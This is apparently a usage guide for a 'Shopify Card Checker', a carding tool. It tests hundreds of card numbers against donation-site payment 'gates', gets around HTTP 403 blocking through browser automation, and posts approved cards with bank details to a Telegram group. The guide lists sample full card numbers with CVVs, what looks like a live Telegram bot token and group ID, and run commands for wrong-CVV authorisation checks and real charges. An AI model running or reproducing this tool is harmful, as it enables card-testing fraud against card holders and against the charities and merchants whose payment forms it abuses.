# Shopify Card Checker - Complete Usage Guide

## Quick Start

### Step 1: Edit Configuration
```bash
nano config.json
```

```json
{
  "telegram": {
    "bot_token": "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s",
    "group_id": "-1003538559040",
    "bot_credit": "@MissNullMe"
  },
  "cards_file": "full_test_cards.txt",
  "gates_file": "donation_gates.json",
  "auth_only": true,
  "max_gates": null,
  "mode": "smart"
}
```

### Step 2: Run Checker
```bash
./run_checker.sh
```

That's it! The checker will:
- ✅ Load cards from `full_test_cards.txt` (707 cards)
- ✅ Load gates from `donation_gates.json` (156 gates)
- ✅ Test in smart mode (bypasses 403 errors)
- ✅ Use auth-only (FREE - wrong CVV)
- ✅ Send results to Telegram in real-time

## Configuration Options

### config.json Structure

```json
{
  "telegram": {
    "bot_token": "YOUR_BOT_TOKEN",      // Telegram bot token
    "group_id": "YOUR_GROUP_ID",        // Telegram group/channel ID
    "bot_credit": "@YourBotName"        // Your bot credit
  },
  "cards_file": "full_test_cards.txt",  // Path to cards file
  "gates_file": "donation_gates.json",  // Path to gates file
  "auth_only": true,                    // true = FREE (wrong CVV), false = real charges
  "max_gates": null,                    // null = all gates, or number like 10
  "mode": "smart"                       // "smart" or "rotate"
}
```

### Cards File Format
```
5137704502263801|12|25|443
4978742321301530|12|25|932
4970407612792304|12|25|714
```
Format: `number|month|year|cvv`

### Gates File Format
```json
[
  {
    "url": "https://donate.example.com",
    "gateway": "Shopify",
    "donation_form": true
  }
]
```

## Different Configurations

### 1. Test Small Batch (Quick Test)
```json
{
  "telegram": { ... },
  "cards_file": "working_cards.txt",     // 6 cards
  "gates_file": "donation_gates.json",
  "auth_only": true,
  "max_gates": 5,                        // Only 5 gates
  "mode": "smart"
}
```

### 2. Full Production Run
```json
{
  "telegram": { ... },
  "cards_file": "full_test_cards.txt",   // 707 cards
  "gates_file": "donation_gates.json",   // 156 gates
  "auth_only": true,
  "max_gates": null,                     // All gates
  "mode": "smart"
}
```

### 3. Real Charges (Costs Money!)
```json
{
  "telegram": { ... },
  "cards_file": "working_cards.txt",
  "gates_file": "donation_gates.json",
  "auth_only": false,                    // ⚠️ REAL CHARGES
  "max_gates": 10,
  "mode": "smart"
}
```

## Modes

### Smart Mode (Recommended)
- ✅ Bypasses HTTP 403 errors
- ✅ Browser-based testing
- ✅ Smart card rotation
- ✅ Finds working cards automatically
- ✅ No HTTP pre-screening

```json
"mode": "smart"
```

### Rotate Mode
- Uses HTTP pre-screening
- May get 403 errors
- Rotates through all cards

```json
"mode": "rotate"
```

## Telegram Notifications

Every result posts to Telegram:

```
━━━━━━━━━━━━━━━━━━━━
✅ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ✅
━━━━━━━━━━━━━━━━━━━━

𝗖𝗖 : 5137704502263801|12|25|443
𝗦𝘁𝗮𝘁𝘂𝘀 : Approved ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : CVV Mismatch

━━━━━━━━━━━━━━━━━━━━
📊 𝗖𝗔𝗥𝗗 𝗜𝗡𝗙𝗢
━━━━━━━━━━━━━━━━━━━━

𝗕𝗜𝗡 : 513770
𝗧𝘆𝗽𝗲 : MASTERCARD DEBIT
𝗟𝗲𝘃𝗲𝗹 : 3DS 🔐
𝗕𝗮𝗻𝗸 : CHASE BANK
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : UNITED STATES 🇺🇸

━━━━━━━━━━━━━━━━━━━━
🌐 𝗚𝗔𝗧𝗘 𝗜𝗡𝗙𝗢
━━━━━━━━━━━━━━━━━━━━

𝗚𝗮𝘁𝗲 : Shopify Charge $1.00
𝗨𝗥𝗟 : https://donate.example.com

━━━━━━━━━━━━━━━━━━━━
⏰ 𝗧𝗜𝗠𝗘 : 2024-01-15 14:30:45 EST
🤖 𝗕𝗼𝘁 𝗕𝘆 : @MissNullMe
━━━━━━━━━━━━━━━━━━━━
```

## Manual Commands

If you prefer manual control:

### Smart Mode
```bash
echo "y" | ./target/release/shopify_checker smart \
  --gates donation_gates.json \
  --cards-file full_test_cards.txt \
  --telegram-config config.json \
  --auth-only=true
```

### With Max Gates
```bash
echo "y" | ./target/release/shopify_checker smart \
  --gates donation_gates.json \
  --cards-file full_test_cards.txt \
  --telegram-config config.json \
  --auth-only=true \
  --max-gates 10
```

### Rotate Mode
```bash
echo "y" | ./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file full_test_cards.txt \
  --telegram-config config.json \
  --auth-only=true
```

## Files

### Input Files
- `config.json` - Main configuration
- `full_test_cards.txt` - 707 cards to test
- `working_cards.txt` - 6 proven working cards
- `donation_gates.json` - 156 donation gates

### Output Files
- `smart_results.json` - Results from smart mode
- `checker_results.json` - Results from other modes
- Telegram notifications - Real-time results

### Scripts
- `run_checker.sh` - Simple runner (uses config.json)
- `test_smart_no_prescreen.sh` - Quick test script

## Troubleshooting

### ChromeDriver Not Running
```bash
chromedriver --port=9515 &
```

### Config File Not Found
```bash
# Make sure config.json exists
ls -la config.json
```

### Cards File Not Found
```bash
# Check file path in config.json
cat config.json | jq '.cards_file'
```

### Telegram Not Working
1. Check bot token is correct
2. Verify group ID is correct
3. Ensure bot is admin in group
4. Test with: `curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<GROUP_ID>&text=Test"`

## Examples

### Example 1: Quick Test (5 gates, 6 cards)
```json
{
  "telegram": { ... },
  "cards_file": "working_cards.txt",
  "gates_file": "donation_gates.json",
  "auth_only": true,
  "max_gates": 5,
  "mode": "smart"
}
```
```bash
./run_checker.sh
```

### Example 2: Full Production (All gates, all cards)
```json
{
  "telegram": { ... },
  "cards_file": "full_test_cards.txt",
  "gates_file": "donation_gates.json",
  "auth_only": true,
  "max_gates": null,
  "mode": "smart"
}
```
```bash
./run_checker.sh
```

### Example 3: Custom Cards and Gates
```json
{
  "telegram": { ... },
  "cards_file": "my_cards.txt",
  "gates_file": "my_gates.json",
  "auth_only": true,
  "max_gates": 20,
  "mode": "smart"
}
```
```bash
./run_checker.sh
```

## Summary

**Simplest Usage:**
1. Edit `config.json` with your settings
2. Run `./run_checker.sh`
3. Monitor Telegram for results

**Everything is configured in one file!**
